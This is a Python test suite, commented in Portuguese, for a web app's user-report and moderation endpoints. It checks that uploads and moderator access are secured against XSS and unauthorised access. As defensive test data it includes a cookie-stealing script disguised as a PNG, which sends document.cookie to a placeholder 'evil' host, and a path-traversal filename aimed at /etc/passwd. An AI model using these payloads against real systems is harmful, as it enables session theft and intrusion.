"""Relatos: quem relata, quem modera, e a foto que não pode virar ataque.

O risco que este arquivo segura tem nome: XSS na sessão de quem modera. A
foto anexada é o caminho óbvio — se ela fosse uma URL enviada pelo cliente, ou
um arquivo servido com o tipo que o cliente declarou, o código rodaria na conta
com mais poder do app.
"""

import pytest
from fastapi.testclient import TestClient

from app.database import get_supabase
from app.deps import get_current_user
from app.main import app
from app.routers.auth import _user_out
from tests.fake_supabase import FakeSupabase

MODERADOR = {"id": "11111111-0000-0000-0000-000000000001", "email": "RodgooCode@Hotmail.com",
             "name": "Rodrigo", "username": "rodgoo", "email_verified_at": "2026-01-01"}
ANA = {"id": "22222222-0000-0000-0000-000000000002", "email": "ana@exemplo.com",
       "name": "Ana Souza", "username": "anasouza", "email_verified_at": "2026-01-01"}
BRUNO = {"id": "33333333-0000-0000-0000-000000000003", "email": "bruno@exemplo.com",
         "name": "Bruno Lima", "username": "brunolima", "email_verified_at": "2026-01-01"}

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
HTML_DISFARCADO = b"<html><script>fetch('//evil/'+document.cookie)</script></html>"


class _Bucket:
    def __init__(self, arquivos):
        self.arquivos = arquivos

    def upload(self, caminho, dados, _opcoes):
        self.arquivos[caminho] = dados

    def download(self, caminho):
        return self.arquivos[caminho]


class _Storage:
    def __init__(self):
        self.arquivos = {}

    def from_(self, _bucket):
        return _Bucket(self.arquivos)

    def create_bucket(self, *_a, **_k):
        return None


@pytest.fixture
def banco():
    duplo = FakeSupabase(pathr_user=[MODERADOR, ANA, BRUNO], pathr_report=[])
    duplo.storage = _Storage()
    return duplo


@pytest.fixture
def como(banco):
    atual = {}
    app.dependency_overrides[get_supabase] = lambda: banco
    app.dependency_overrides[get_current_user] = lambda: atual["user"]
    cliente = TestClient(app)

    def trocar(user):
        atual["user"] = user
        return cliente

    yield trocar
    app.dependency_overrides.clear()


def _relatar(cliente, foto=None, tipo="reclamacao", mensagem="O botão de salvar não responde."):
    arquivos = {"foto": ("print.png", foto, "image/png")} if foto is not None else None
    return cliente.post("/relatos", data={"tipo": tipo, "mensagem": mensagem, "pagina": "config"}, files=arquivos)


def test_relato_com_foto_de_verdade_e_aceito(como, banco):
    resposta = _relatar(como(ANA), foto=PNG)
    assert resposta.status_code == 201
    assert resposta.json()["has_attachment"] is True
    assert banco.linhas("pathr_report")[0]["attachment_type"] == "image/png"


def test_html_disfarcado_de_png_e_recusado_e_nada_e_gravado(como, banco):
    resposta = _relatar(como(ANA), foto=HTML_DISFARCADO)
    assert resposta.status_code == 415
    assert banco.linhas("pathr_report") == []
    assert banco.storage.arquivos == {}


def test_caminho_do_anexo_e_escolhido_pelo_servidor(como, banco):
    """O nome que o cliente mandou ("print.png", ou "../../x") não entra no caminho."""
    como(ANA).post(
        "/relatos",
        data={"tipo": "sugestao", "mensagem": "Um modo escuro ainda mais escuro."},
        files={"foto": ("../../../etc/passwd.png", PNG, "image/png")},
    )
    relato = banco.linhas("pathr_report")[0]
    assert relato["attachment_path"] == f"{relato['id']}.png"


@pytest.mark.parametrize("tipo, mensagem, codigo", [("elogio", "Tudo ótimo por aqui!", 400), ("sugestao", "curto", 400)])
def test_formulario_invalido_e_recusado(como, tipo, mensagem, codigo):
    assert _relatar(como(ANA), tipo=tipo, mensagem=mensagem).status_code == codigo


def test_quem_nao_modera_nao_ve_nem_descobre_a_moderacao(como):
    _relatar(como(ANA))
    assert como(BRUNO).get("/relatos/moderacao").status_code == 404
    relato_id = como(ANA).get("/relatos/meus").json()[0]["id"]
    assert como(BRUNO).patch(f"/relatos/{relato_id}", json={"status": "resolvido"}).status_code == 404


def test_moderador_ve_todos_com_autor_e_resolve(como):
    _relatar(como(ANA))
    _relatar(como(BRUNO), tipo="sugestao", mensagem="Dá para ter tema claro?")
    lista = como(MODERADOR).get("/relatos/moderacao").json()
    assert {r["author"]["username"] for r in lista} == {"anasouza", "brunolima"}

    alvo = lista[0]["id"]
    resposta = como(MODERADOR).patch(f"/relatos/{alvo}", json={"status": "resolvido", "moderator_note": "Corrigido."})
    assert resposta.status_code == 200
    assert all(r["id"] != alvo for r in como(MODERADOR).get("/relatos/moderacao").json())


def test_cada_pessoa_ve_so_os_proprios_relatos(como):
    _relatar(como(ANA))
    _relatar(como(BRUNO), tipo="sugestao", mensagem="Quero exportar o plano em PDF.")
    assert [r["kind"] for r in como(ANA).get("/relatos/meus").json()] == ["reclamacao"]


def test_foto_so_sai_para_o_autor_e_para_a_moderacao(como):
    relato_id = _relatar(como(ANA), foto=PNG).json()["id"]
    assert como(ANA).get(f"/relatos/{relato_id}/foto").status_code == 200
    assert como(MODERADOR).get(f"/relatos/{relato_id}/foto").status_code == 200
    assert como(BRUNO).get(f"/relatos/{relato_id}/foto").status_code == 404


def test_foto_sai_com_sandbox_e_nosniff(como):
    relato_id = _relatar(como(ANA), foto=PNG).json()["id"]
    resposta = como(MODERADOR).get(f"/relatos/{relato_id}/foto")
    assert resposta.headers["content-type"] == "image/png"
    assert resposta.headers["x-content-type-options"] == "nosniff"
    assert "sandbox" in resposta.headers["content-security-policy"]


def test_arquivo_trocado_no_bucket_nao_sai_como_imagem(como, banco):
    """Se alguém trocar o arquivo no bucket por fora, a conferência na saída segura."""
    relato_id = _relatar(como(ANA), foto=PNG).json()["id"]
    banco.storage.arquivos[f"{relato_id}.png"] = HTML_DISFARCADO
    assert como(MODERADOR).get(f"/relatos/{relato_id}/foto").status_code == 404


def test_id_malformado_e_404(como):
    assert como(MODERADOR).get("/relatos/nao-e-uuid/foto").status_code == 404


def test_moderador_e_reconhecido_sem_distinguir_caixa_do_email():
    assert _user_out({**MODERADOR}).is_moderator is True
    assert _user_out({**ANA}).is_moderator is False
